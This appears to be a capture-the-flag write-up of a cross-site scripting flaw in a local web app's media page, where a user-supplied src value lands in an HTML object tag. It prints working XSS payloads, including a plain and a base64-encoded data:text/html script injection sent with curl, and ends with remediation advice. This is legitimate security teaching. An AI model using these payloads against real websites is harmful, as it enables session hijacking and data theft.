## XSS via Image Link Vulnerability

### Summary
A cross-site scripting (XSS) vulnerability was discovered in the media page, where user-supplied data is directly inserted into the `data` attribute of an HTML `<object>` tag.

### Methodology
1. Identified the vulnerable code:
	```html
	<object data="{src_value}"></object>
	```
2. Tested with a simple HTML injection:
	```
	http://localhost:8080/index.php?page=media&src=data:text/html,<h2>Hello</h2>
	```
	- Confirmed that arbitrary HTML is rendered.
3. Tested with a script injection:
	```
	http://localhost:8080/index.php?page=media&src=data:text/html,<sCript>alert(42)</Script>
	```
	- Confirmed that JavaScript executes, proving XSS.
4. Discovered that base64-encoded HTML is also executed:
	```bash
	curl http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4K | grep flag
	```
	- The flag is returned when the payload is base64-encoded.

### Findings
- The application is vulnerable to XSS via direct insertion of user input into HTML attributes.
- Attackers can execute arbitrary JavaScript, potentially stealing data or compromising user sessions.
- Base64-encoded payloads are also executed, increasing the attack surface.

### Recommendation
- Implement strict input validation and sanitization for all user-supplied data.
- Avoid direct insertion of untrusted data into HTML attributes.
- Consider using Content Security Policy (CSP) to mitigate XSS risks.
